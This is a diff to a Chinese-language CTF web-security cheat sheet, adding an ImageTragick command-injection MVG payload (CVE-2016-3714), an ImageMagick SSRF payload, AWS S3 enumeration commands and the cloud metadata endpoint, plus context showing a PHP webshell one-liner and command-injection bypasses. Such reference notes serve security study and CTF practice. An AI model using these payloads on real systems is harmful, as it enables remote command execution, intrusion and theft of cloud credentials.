@@ -12,6 +12,7 @@ Table of Contents
 *  [Command Injection](#command-injection)
     * [Bypass Space](#空白繞過)
     * [Bypass Keyword](#keyword繞過)
+    * [ImageMagick](#imagemagick-imagetragick)
 *  [SQL Injection](#sql-injection)
     * [MySQL](#mysql)
     * [MSSQL](#mssql)
@@ -193,6 +194,8 @@ A=fl;B=ag;cat $A$B
 - `'abc' == 0`
 - `'123a' == 123`
 - `'0x01' == 1`
+    - PHP 7.0後，16進位字串不再當成數字
+    - e.g `var_dump('0x01' == 1)` => false
 - `'' == 0 == false == NULL`
 - `md5([1,2,3]) == md5([4,5,6]) == NULL`
     - 可用在登入繞過 (用戶不存在，則password為NULL)
@@ -438,6 +441,19 @@ cat $(ls)
     - `cat fl""ag`
     - `cat fl''ag`
         - `cat "fl""ag"`
+
+## ImageMagick (ImageTragick)
+
+- CVE-2016-3714
+- `mvg`格式包含https處理(使用curl下載)，可以閉合雙引號
+- payload:
+
+```mvg
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://kaibro.tw";ls "-la)'
+pop graphic-context
+```
 
 # SQL Injection
 
@@ -1352,7 +1368,7 @@ localhost
 ::ffff:127.0.0.1
 ::1%1
 
-128.127.12.34.56 (127.0.0.1/8)
+127.12.34.56 (127.0.0.1/8)
 127.0.0.1.xip.io
 
 http://2130706433 (decimal)
@@ -1436,6 +1452,18 @@ header( "Location: gopher://127.0.0.1:9000/x%01%01Zh%00%08%00%00%00%01%00%00%00%
             - Connection Phase
             - Command Phase
         - `gopher://127.0.0.1:3306/_<PAYLOAD>`
+
+    - ImageMagick - CVE-2016-3718
+        - 可以發送HTTP或FTP request
+        - payload: ssrf.mvg
+        ```
+        push graphic-context
+        viewbox 0 0 640 480
+        fill 'url(http://example.com/)'
+        pop graphic-context
+        ```
+        - `$ convert ssrf.mvg out.png`
+    
 
 ## CRLF injection
 
@@ -1600,6 +1628,23 @@ xxe.dtd:
              - Fast-CGI開啟狀況下
              - kaibro.jpg: `<?php fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>');?>`
              - 訪問`kaibro.jpg/.php`生成shell.php
+
+- AWS常見漏洞
+    - S3 bucket權限配置錯誤
+        - nslookup判斷
+            - `nslookup 87.87.87.87`
+            - `s3-website-us-west-2.amazonaws.com.`
+        - 確認bucket
+            - 訪問`bucketname.s3.amazonaws.com`
+            - 成功會返回bucket XML資訊
+        - awscli工具
+            - 列目錄 `aws s3 ls s3://bucketname/ --region regionname`
+            - 下載 `aws sync s3://bucketname/ localdir --region regionname`
+    - metadata
+        - http://169.254.169.254/latest/meta-data/
+        - Tool 
+            - https://andresriancho.github.io/nimbostratus/
+
 - 常見Port服務
     - http://packetlife.net/media/library/23/common_ports.pdf
 - `php -i | grep "Loaded Configuration File"`
@@ -1631,6 +1676,10 @@ xxe.dtd:
     - MySQL utf8編碼只支援3 bytes
     - 若將4 bytes的utf8mb4插入utf8中，在non strict模式下會被截斷
     - CVE-2015-3438 WordPress Cross-Site Scripting Vulnerability
+
+- Apache Tomcat Session操縱漏洞
+    - 預設session範例頁面`/examples/servlets /servlet/SessionExample`
+    - 可以直接對Session寫入
 
 - tcpdump
     - `-i` 指定網卡，不指定則監控所有網卡
